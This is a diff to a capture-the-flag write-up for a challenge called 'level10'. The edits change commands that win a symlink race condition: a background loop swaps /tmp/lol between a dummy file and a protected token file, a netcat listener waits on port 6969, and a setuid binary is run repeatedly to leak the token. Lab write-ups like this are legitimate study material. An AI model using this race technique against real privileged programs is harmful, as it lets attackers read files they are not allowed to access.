@@ -21,13 +21,13 @@ To find the solution:
 ln -s /home/user/level10/token /tmp/lol; ./level10 /tmp/lol lol
 rm /tmp/lol; echo "lol" > /tmp/lol; ./level10 /tmp/lol lol
 nc 6969 -l => Run it every time we launch level10 (on a different terminal)
-rm /tmp/lol; echo "lol" > /tmp/lol; strace ./level10 /tmp/lol 192.168.56.3
+rm /tmp/lol; echo "lol" > /tmp/lol; strace ./level10 /tmp/lol 127.0.0.1
 ```
 
 To exploit the security hole:
 - Running in the background     : `echo "lal" > /tmp/lal; (while true; do ln -fs /tmp/lal /tmp/lol && ln -fs /home/user/level10/token /tmp/lol; done)&`
-- Running in a terminal         : `nc 6969 -l`
-- Running in another terminal   : `./level10 /tmp/lol 192.168.56.3`
+- Running in a terminal         : `while true ; do nc -l 6969; done`
+- Running in another terminal   : `for i in `seq 50`; do ./level10 /tmp/lol 127.0.0.1; done`
 - Run it several times if needed! Do not forget to kill the process once you get the flag `kill -9 <pid>`!
 
 ## 🔍 Resources
